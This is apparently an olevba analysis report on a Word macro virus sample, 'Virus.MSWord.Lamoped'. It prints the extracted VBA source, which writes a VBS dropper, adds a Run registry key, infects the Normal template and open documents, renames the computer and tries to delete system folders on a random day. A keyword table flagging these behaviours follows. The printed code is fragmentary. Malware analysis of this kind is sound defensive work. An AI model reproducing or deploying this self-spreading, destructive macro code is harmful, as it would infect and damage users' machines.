olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lamoped
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lamoped - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSWord.Lamoped - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Attribute VB_Name = "THIS DOCUMENT"
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Private Sub Document_Close()
On Error Resume Next
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "p.r.s") = "C:\p.r.s.vbs"
Open "C:\p.r.s.vbs" For Output As #1
Print #1, "Set wordobj = CreateObject(" & Chr(34) & "Word.Application" & Chr(34) & ")"
Print #1, "p.r.s = wscript.ScriptFullName"
Print #1, "Set NT = wordobj.NormalTemplate.VBProject.VBComponents.Item(1)"
Print #1, "NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines"
Print #1, "NT.CodeModule.AddFromFile p.r.s"
Print #1, "NT.CodeModule.DeleteLines 1, 7"
Print #1, "wordobj.Quit"
Print #1, TD
Close #1
Set wordobj = CreateObject("Word.Application")
p.r.s = wscript.ScriptFullName
Set NT = wordobj.NormalTemplate.VBProject.VBComponents.Item(1)
NT.CodeModule.DeleteLines 1, NT.CodeModule.CountOfLines
NT.CodeModule.AddFromFile p.r.s
NT.CodeModule.DeleteLines 1, 9
wordobj.Quit
End If
Next
For MainLoop = 1 To 2
If MainLoop = 1 Then Set Target = Documents Else Set Target = Templates
For TargetCount = 1 To Target.Count
Set TargetComponents = Target(TargetCount).VBProject.VBComponents
For ModuleCount = 1 To TargetComponents.Count
Function_Exist = False
TargetCodeChanged = False
For TargetLines = 1 To TargetComponents(ModuleCount).CodeModule.CountOfLines

If TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) = "Private Function p.r.s()" Then Function_Exist = True
If Left(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 12) = "Private Sub " And Right(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 8) <> ": p.r.s" Then
TargetComponents(ModuleCount).CodeModule.ReplaceLine TargetLines, TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) & ": p.r.s"
TargetCodeChanged = True

ElseIf Left(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 4) = "Sub " And Right(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 8) <> ": p.r.s" Then
TargetComponents(ModuleCount).CodeModule.ReplaceLine TargetLines, TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) & ": p.r.s"
TargetCodeChanged = True
End If
Next
If Function_Exist = False Then TargetComponents(ModuleCount).CodeModule.AddFromString MyCode
If Function_Exits = False Or TargetCodeChanged = True Then

If MainLoop = 1 Then Documents(TargetCount).SaveAs FileName:=Documents(TargetCount).FullName
If MainLoop = 2 Then Templates(TargetCount).Save
End If
Next
Next
Next
End Function
Declare Function SetComputerName Lib "kernel32" Alias "SetComputerNameA" _
(ByVal lpComputerName As String) As Long
Name = SetComputerName("AHSAN JUTT VXER")
End If
Public Declare Function RemoveDirectory Lib "kernel32" Alias "RemoveDirectoryA" _
(ByVal lpPathName As String) As Long
If Day(Now()) = Int(Rnd() * 30 + 1) Then
num = Int(Rnd * 4) + 1 '
If num = 1 Then fuck$ = "C:\Windows"
If num = 2 Then fuck$ = "C:\Program Files"
If num = 3 Then fuck$ = "C:\My documents"
Lwinfuck = RemoveDirectory(fuck$)
End If
Private Sub Document_Open()
'W2000\VBS.P.R.S
'CREATED BY A.v_Killer(Pakbarin) PAKISTAN , SAHIWAL
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |s.vbs               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

